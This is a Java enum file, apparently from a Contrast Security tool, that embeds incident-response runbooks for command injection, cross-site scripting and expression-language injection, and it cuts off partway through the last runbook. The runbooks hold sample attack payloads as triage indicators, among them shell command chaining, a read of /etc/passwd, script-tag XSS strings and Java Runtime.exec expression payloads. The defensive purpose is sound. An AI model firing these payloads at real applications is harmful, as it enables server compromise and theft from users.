/*
 * Copyright 2025 Contrast Security
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.contrast.labs.ai.mcp.contrast.data;

import java.util.List;
import java.util.Optional;

public enum RunBookEnum {
  COMMAND_INJECTION(
      List.of(
          "cmd-injection",
          "cmd-injection-semantic-chained-commands",
          "cmd-injection-semantic-dangerous-paths",
          "cmd-injection-command-backdoors",
          "cmd-injection-process-hardening"),
      """
      ---
      layout: runbook
      title: "Command Injection"
      description: "Guide for detecting and responding to command injection attacks, where attackers exploit vulnerabilities to execute arbitrary operating system commands on the server"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # Command Injection Runbook

      Command injection is a malicious technique where attackers exploit vulnerabilities in web applications to inject and execute arbitrary operating system (OS) commands on the server. By manipulating input data, attackers can manipulate the application's execution flow, tricking it into running unintended system commands.This can result in data breaches, system compromise, etc. Contrast uses various detection capabilities for Command Injection. Some track malicious input into commands being run, some detect sensitive file paths being accessed, and so forth.\s


      Example Event - Exploited outcome Command Injection \s
      `Oct 25 11:02:31 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The parameter cmd had a value that successfully exploited cmd-injection - whoami|WARN|pri=cmd-injection src=0:0:0:0:0:0:0:1 spt=8080 request=/cmd requestMethod=GET app=webapplication outcome=EXPLOITED` \s
       \s
       \s

      Example Event - Blocked outcome Command Injection \s
      `Oct 25 11:02:31 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The parameter cmd had a value that successfully exploited cmd-injection - whoami|WARN|pri=cmd-injection src=0:0:0:0:0:0:0:1 spt=8080 request=/cmd requestMethod=GET app=webapplication outcome=BLOCKED`
       \s
       \s



      \\
      Is the event a "cmd-injection-process-hardening" event?   [Yes](#handling-process-hardening)


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Ineffective](#ineffective)
      - [Success](#success)


      ## Exploited

      "Exploited" means Contrast detected an input coming into an application that looked like command injection and then confirmed the input performed a command injection during a call to the operating system by observing the execution of the injected command and its effects on the system. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Does a system command get run in the application as part of normal usage?
      - Are there command chaining operators present? (&& || ; & |)
      - Are there command substitution characters present? ($(), ``)
      - Do the commands seem to be accessing suspicious files? (/etc/password/)
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there unusual os/system related messages around the same timestamp as the event?
      - Are there application logs with OS error messages around the same timestamp as the event?



      \\
      Examples:

      - `original_cmd_by_server $(cat /etc/passwd)`
      - `original_cmd_by_server; command2`
      - `original_cmd_by_server && command2`
      - `original_cmd_by_server || command2` \s

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" means Contrast detected an input coming into an application that looked like command injection and then confirmed the input performed a command injection during a call to the operating system and therefore blocked the execution of it. \s

      To verify this is a true positive, review the following attributes of the event:

      - Does a system command get run in the application as part of normal usage?
      - Are there command chaining operators present? (&& || ; & |)
      - Are there command substitution characters present? ($(), ``)
      - Do the commands seem to be accessing suspicious files? (/etc/password/)
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there unusual os/system related messages around the same timestamp as the event?
      - Are there application logs with OS error messages around the same timestamp as the event?


      \\
      Examples:

      - `original_cmd_by_server $(cat /etc/passwd)`
      - `original_cmd_by_server; command2`
      - `original_cmd_by_server && command2`
      - `original_cmd_by_server || command2` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Ineffective

      "Ineffective" means Contrast detected an input coming into an application that looked like command injection, but did not confirm the input performed a command injection during execution. This is called a “Probe” within the Contrast UI. This event is an unsuccessful attempt at an exploit. They can indicate an attack fuzzing and looking for vulnerabilities.

      - Does the probe event appear to be caused by legitimate traffic and numerous similar probe events are being generated, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured to clean up Contrast data. \s
      - Is the probe originating from a specific ip[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?   Consider… \s
        - Block using network appliance
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account \s
        - Determine if the account is a legitimate account
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s

      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s
      ## Handling Process Hardening \s

      Process Hardening refers to a block that the agent applies to the application to be able to start external processes. Most web applications have no reason to launch external processes so this rule is intended to ensure that no attempts are made by an application to do so.

      When triaging this event type the key is in understanding if the web application starts external processes under normal conditions.

      Choose the Appropriate Action: \s
      If the application should NOT start external processes:
      - Enable Block Mode: This will prevent the application from launching any external processes, ensuring maximum security. \s

      \\
      If the application DOES need to start external processes:

      - Monitor Mode (Recommended): Start with monitor mode to observe the commands the application executes. This helps identify legitimate use cases and potential risks without disrupting normal functionality.
      - Exclusions: If monitoring reveals legitimate needs, configure an exclusion to allow only specific, trusted external processes to run. Once all legitimate executions are accounted for, the rule can be placed into Block mode.
      - Disable the Rule (Use with Caution): If the application requires external process execution and other options are not feasible consider disabling the rule.
      """),
  XSS(
      List.of("reflected-xss"),
      """
      ---
      layout: runbook
      title: "Cross-Site Scripting (XSS)"
      description: "Guide for handling cross-site scripting vulnerabilities where attackers inject malicious JavaScript code into websites viewed by other users"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # Cross-Site Scripting (XSS) Runbook

      Cross-site scripting (XSS) is a type of web security vulnerability that allows an attacker to inject malicious JavaScript code into websites viewed by other users. Instead of the website displaying trusted content, the attacker's code is executed, which can compromise user accounts, steal sensitive data, or even take control of the user's browser.

       \s
       \s

      Example Event - Blocked outcome Cross-Site Scripting (XSS) \s
      `Oct 08 10:43:57 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The querystring QUERYSTRING had a value that successfully exploited reflected-xss - message=%3Cscript%3Ealert(document.domain(%3C/script%3E|WARN|pri=reflected-xss src=1.1.1.1 spt=8080 request=/error requestMethod=GET app=webapplication outcome=BLOCKED`
       \s

      Example Event 1 - Suspicious outcome Cross-Site Scripting (XSS) \s
      `Oct 08 08:28:20 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The parameter message had a value that that was marked suspicious reflected-xss - <script>alert(document.domain)</script>|WARN|pri=reflected-xss src=1.1.1.1 spt=8080 request=/xss requestMethod=GET app=webapplication outcome=SUSPICIOUS` \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s


      - [Blocked](#blocked)
      - [Suspicious](#suspicious)

      - [Success](#success)




      ## Blocked

      "Blocked" means Contrast detected an input coming into an application that looked like a cross-site scripting attack and subsequently blocked it.  \s

      To verify this is a true positive, review the following attributes of the event:

      - Are HTML tags included in the payload? (<>,  </>)
      - Are suspicious HTML attributes present in the payload? (onerror, onload, onfocus, etc)
      - Look for any suspicious protocols within the payload, such as javascript: or data:.
      - Are there application logs with relevant error messages?


      \\
      Examples:

      - `<script>alert('XSS')</script>`
      - `<img src=x onerror=alert('XSS')>`
      - `<a href='javascript:alert(1)'>Click me</a>`
      - `javascript:alert(1)`
      - `data:text/html,<script>alert(1)</script>` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s



      ## Suspicious

      "Suspicious" means Contrast detected an input coming into an application that looked like a cross-site scripting payload. Contrast reports suspicious for non-input tracing rules where Contrast is unable to verify that an attack occurred, and the rule is in monitor mode. \s

      To verify this is a true positive, review the following attributes of the event:

      - Are HTML tags included in the payload? (<>,  </>)
      - Are suspicious HTML attributes present in the payload? (onerror, onload, onfocus, etc)
      - Look for any suspicious protocols within the payload, such as javascript: or data:.
      - Are there application logs with relevant error messages?


      \\
      Examples:

      - `<script>alert('XSS')</script>`
      - `<img src=x onerror=alert('XSS')>`
      - `<a href='javascript:alert(1)'>Click me</a>`
      - `javascript:alert(1)`
      - `data:text/html,<script>alert(1)</script>` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#suspicious-false-positive) \s
      - [Yes, or unsure](#suspicious-true-positive)\s




      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s






      ## Suspicious True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be switched to “Block” mode which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a Virtual Patch that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Suspicious False Positive

      If the event seems to be a False Positive, consider the following options:
      - Ignore
      - Create Exclusion \s

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s




      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """),
  EXPRESSION_LANGUAGE(
      List.of("expression-language-injection"),
      """
      ---
      layout: runbook
      title: "Expression Language Injection"
      description: "Guide for addressing server-side code injection vulnerabilities where attackers exploit expression language evaluation to compromise application data and functionality"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # Expression Language Injection Runbook

      Expression Language Injection works by taking advantage of server-side code injection vulnerabilities which occur whenever an application incorporates user-controllable data into a string that is dynamically evaluated by a code interpreter. This can lead to complete compromise of the application's data and functionality, as well as the server that is hosting the application.


      Example Event - Exploited outcome Expression Language Injection \s
      `Oct 22 2024 12:09:18.532-0600 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.5.4|SECURITY|The parameter message had a value that successfully exploited expression-language-injection - T(java.lang.Runtime).getRuntime().exec("whoami")|WARN|pri=expression-language-injection src=0:0:0:0:0:0:0:1 spt=8080 request=/hello requestMethod=GET app=webapplication outcome=EXPLOITED` \s
       \s
       \s

      Example Event - Blocked outcome Expression Language Injection \s
      `Oct 22 2024 12:14:22.969-0600 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.5.4|SECURITY|The parameter message had a value that successfully exploited expression-language-injection - T(java.lang.Runtime).getRuntime().exec("whoami")|WARN|pri=expression-language-injection src=0:0:0:0:0:0:0:1 spt=8080 request=/hello requestMethod=GET app=webapplication outcome=BLOCKED`
       \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Ineffective](#ineffective)
      - [Success](#success)


      ## Exploited

      An "Exploited" outcome indicates that Contrast detected an input entering an application that resembled Expression Language Injection. It then confirmed that this input was utilized in the evaluation of the expression language. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Does the payload contain references to Java classes or methods?
      - Does the payload contain os commands?
      - Does the payload contain template engine expressions? (e.g. ${...}, #{...}, *{...})
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there application logs with template engine related error messages around the same timestamp as the event?



      \\
      Examples:

      - `T(java.lang.Runtime).getRuntime().exec("whoami")`
      - `${pageContext.request.getSession().setAttribute("admin",true)}`
      - `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` \s

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      A "Blocked" outcome indicates that Contrast detected an input entering an application that resembled Expression Language Injection. It then confirmed that this input was going to be evaluated by the expression language and therefore blocked it. \s

      To verify this is a true positive, review the following attributes of the event:

      - Does the payload contain references to Java classes or methods?
      - Does the payload contain os commands?
      - Does the payload contain template engine expressions? (e.g. ${...}, #{...}, *{...})
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there application logs with template engine related error messages around the same timestamp as the event?


      \\
      Examples:

      - `T(java.lang.Runtime).getRuntime().exec("whoami")`
      - `${pageContext.request.getSession().setAttribute("admin",true)}`
      - `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Ineffective

      "Ineffective" means Contrast detected an input coming into an application that looked like Expression Language injection, but did not confirm that the input was used evaluated by the expression template engine. This is called a “Probe” within the Contrast UI. This event is a real attack attempt to exploit your application, but it was ineffective. Probes can indicate an attacker scanning or exploring for vulnerabilities.

      - Does the probe event appear to be caused by legitimate traffic and numerous similar probe events are being generated, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured to clean up Contrast data. \s
      - Is the probe originating from a specific ip[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?   Consider… \s
        - Block using network appliance
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account \s
        - Determine if the account is a legitimate account
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s








      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

